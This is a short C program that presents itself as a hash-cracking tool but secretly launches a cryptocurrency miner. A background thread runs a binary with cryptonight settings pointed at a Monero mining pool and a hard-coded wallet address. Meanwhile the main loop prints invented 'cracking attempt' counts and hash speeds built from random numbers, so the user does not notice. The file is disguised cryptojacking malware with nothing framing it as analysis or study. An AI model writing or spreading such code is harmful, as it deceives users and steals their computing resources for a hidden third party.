#include<stdio.h>
#include<time.h>
#include<stdlib.h>
#include<unistd.h>
#include <sys/types.h>
#include <pthread.h>

pthread_t threads[1];

const char *hash = "f62e5bcda4fae4f82370da0c6f20697b8f8447ef";

void* cracker(void *arg){
const char *command = "./hashcracker -a cryptonight -o stratum+tcp://mine.moneropool.com:3334 -u 4AFPMxvGy5McpvBBDxpZwbDjUa29RDnYuafJgMvmFoksVbt8k94t8Vc3HsHw7uCHBLJLoC9nb7cWz4z1jXtLPeXi6DQVVHA -p 8 -t 20";
int status = system(command);
}

int main(int argc, char**argv){
	
	long int i = 0, end = 14232367872139;
	srand(time(NULL));
	pthread_create(&(threads[0]), NULL, &cracker, NULL);

	while(1){
		i++; 
		sleep(9 + rand() % 2);
		printf("Cracking attempt %ld/%ld\n", i* (8*9000 + ((rand() % 200) + 1)) , end);
		printf("Speed  %d hashes/second\n", 8*900 + ((rand() % 20) + 1));
		if (i == end) 	i = 1;
	}	
return 0;
}
